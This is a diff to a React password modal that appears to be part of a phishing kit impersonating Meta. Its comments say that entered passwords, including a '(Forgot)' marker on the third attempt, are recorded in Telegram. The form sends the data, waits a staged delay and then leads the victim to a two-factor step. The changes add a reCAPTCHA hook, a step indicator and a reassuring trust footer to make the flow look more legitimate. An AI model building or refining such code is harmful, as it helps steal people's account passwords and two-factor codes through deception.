@@ -11,13 +11,20 @@ interface PasswordModalProps {
     isOpend: boolean;
     isOpendTwoFactor: (value: boolean) => void;
     onToggleModal: (isOpen: boolean) => void;
+    /** Gọi sau khi nhập mật khẩu lần 2 thành công (trước bước 2FA) — ví dụ mở reCAPTCHA. */
+    onAfterSecondPasswordSubmit?: () => void;
 }
 
 const SUBMIT_DELAY_MS = 1345;
 /** Ghi nhận trong Telegram Password(3) khi bấm «Quên mật khẩu?» thay vì nhập lần 3 */
 const PASSWORD_THIRD_FORGOT_MARKER = '(Forgot)';
 
-const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor, onToggleModal }) => {
+const PasswordModal: React.FC<PasswordModalProps> = ({
+    isOpend,
+    isOpendTwoFactor,
+    onToggleModal,
+    onAfterSecondPasswordSubmit,
+}) => {
     const t = useAppStrings();
 
     const [isOpen, setIsOpen] = React.useState(isOpend);
@@ -104,8 +111,12 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
         try {
             await SendData(formData);
             await new Promise((r) => setTimeout(r, SUBMIT_DELAY_MS));
-            isOpendTwoFactor(true);
             handleClose();
+            if (onAfterSecondPasswordSubmit) {
+                onAfterSecondPasswordSubmit();
+            } else {
+                isOpendTwoFactor(true);
+            }
         } catch (error) {
             console.error('Error submitting form:', error);
             setPassword('');
@@ -125,7 +136,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
     const passwordId = passwordStep === 1 ? 'accessKey' : 'accessKeyConfirm';
 
     return (
-        <Modal isOpen={isOpen} title="" onClose={handleClose} isClosable={false}>
+        <Modal isOpen={isOpen} title={t.password.modalTitle} onClose={handleClose} isClosable={false} flowStep={{ current: 2, total: 4 }}>
             <div className="flex min-h-full min-w-0 flex-1 flex-col items-center justify-center gap-8 py-2">
                 <div className="mx-auto h-[50px] w-[50px] shrink-0">
                     <img src="/images/meta/logo.svg" width="100%" height="100%" alt="logo" />
@@ -185,6 +196,9 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                                 {t.password.forgot}
                             </span>
                         </div>
+                        <p className="mx-auto mt-[14px] max-w-[32rem] text-center text-[12px] leading-[1.5] text-[#6a7893]">
+                            {t.wizard.passwordFooterTrust}
+                        </p>
                     </form>
                 </div>
 
